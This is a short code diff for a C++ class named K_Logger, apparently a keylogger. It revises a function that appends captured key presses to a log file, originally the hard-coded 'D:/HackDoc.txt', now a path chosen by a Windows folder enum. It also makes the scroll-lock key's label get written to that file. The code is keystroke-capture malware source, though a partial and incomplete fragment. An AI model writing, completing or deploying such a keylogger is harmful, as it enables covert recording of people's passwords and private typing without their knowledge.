@@ -1,10 +1,19 @@
 #include "basic_functions.h"
-#include "os_paths/windows_os_paths.h"
 
-void K_Logger::WriteToDoc(LPCSTR text)
+void K_Logger::WriteToDoc(LPCSTR text, WindowsOSPath windows_path)
 {
 	std::fstream doc_to;
-	const string filePath = "D:/HackDoc.txt";
+	string filePath;
+
+	switch (windows_path)
+	{
+	case DOWNLOADS:
+		filePath = "";
+		break;
+
+	default:
+		break;
+	}
 
 	doc_to.open(filePath, fstream::app | fstream::in);
 	doc_to << text;
@@ -17,7 +26,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 	{
 	case VK_SCROLL:
 		cout << " *SCROLL* ";
-		WriteToDoc("");
+		WriteToDoc(" *SCROLL* ");
 		break;
 
 	case 48:
